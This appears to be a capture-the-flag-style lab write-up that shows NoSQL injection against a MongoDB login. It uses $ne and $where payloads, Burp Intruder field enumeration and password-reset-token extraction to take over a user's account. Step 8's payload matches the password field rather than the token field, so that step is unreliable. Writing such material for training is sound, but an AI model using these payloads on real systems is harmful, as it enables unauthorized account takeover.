# üß™ Field Enumeration to Full Account Takeover with NoSQL Injection

## Exploited a NoSQL injection flaw to enumerate hidden fields and extract a valid password reset token, leading to a seamless account takeover.

## üìò Introduction

This lab demonstrates a NoSQL injection vulnerability in a MongoDB-backed login system. By abusing MongoDB operators like `$ne` and `$where`, we can bypass authentication checks, enumerate hidden user fields, and finally extract a password reset token to hijack an account. This step-by-step PoC reveals how NoSQL injections can lead to full account compromise when input validation and query construction are insufficiently secured.

## üß© Step-by-Step PoC

1. Access the Lab, try to sign in with username `carlos` and any random password, intercept the request with Burp Suite.

![1](https://github.com/user-attachments/assets/5db5158e-0f8e-49d7-bff9-7341434e48df) <br/>

2. Send the intercepted POST `/login` request to Repeater with body:

   ```json
   {
     "username": "carlos",
     "password": "test"
   }
   ```

   Response:

   ```
   Invalid username or password
   ```

![2](https://github.com/user-attachments/assets/b64ff556-c623-479a-86c6-6f19407b42c2) <br/>

3. Try bypass using the MongoDB not equal operator `$ne`:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" }
   }
   ```

   Response:

   ```
   Account locked: please reset your password
   ```

![3](https://github.com/user-attachments/assets/14a947d6-a252-462f-bf1f-a74e9172ce7f) <br/>

   Although the login is not bypassed, the `$ne` operator is accepted, confirming injection.

4. Add the `$where` parameter as `0` (false):

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "0"
   }
   ```

   Response:

   ```
   Invalid username or password
   ```

![4](https://github.com/user-attachments/assets/054028a7-a68c-4b7d-b8b9-3ecd539b11b4) <br/>

5. Change `$where` to `1` (true):

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "1"
   }
   ```

   Response:

   ```
   Account locked: please reset your password
   ```

![5](https://github.com/user-attachments/assets/adf73799-5539-4e94-aec2-2f77a01a08e3) <br/>

   This proves the `$where` clause is evaluated and injectable.

6. Enumerate user document fields with Intruder. Use the payload:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "Object.keys(this)[¬ß¬ß].match('^.{}.*')"
   }
   ```

   Attack setup:

   * Attack type: Cluster Bomb
   * Payload position 1 (¬ß¬ß): Numbers, from 0 to 20
   * Payload position 2 (¬ß¬ß): Brute force characters: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789` (min/max length 1)

   Interpretation:

   * Index 0: `_id` (default)
   * Index 1: `username`
   * Index 2: `password`

![6](https://github.com/user-attachments/assets/3fc45c03-7292-481f-aca4-71980a6aa95b) <br/>

   By incrementing the index, you discover all user fields, including a password reset token.

7. Capture the `GET /forgot-password` request in Proxy. This endpoint is related to password reset.

![7](https://github.com/user-attachments/assets/9e40da66-3ec6-4c12-af84-5dd468ced5a7) <br/>

8. Use Intruder with payload to extract token value:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "this.password.match('^.{}.*')"
   }
   ```

   Extracted token (example):

   ```
   zw81ejagwjes6l1wgpn
   ```

![8](https://github.com/user-attachments/assets/ea9261f8-5b50-4ed0-8f71-933f08298941) <br/>

9. Use the extracted token as a GET parameter in the forgot-password URL:

   ```
   /forgot-password?resetToken=zw81ejagwjes6l1wgpn
   ```

   You can now reset Carlos‚Äôs password and log in, solving the lab.
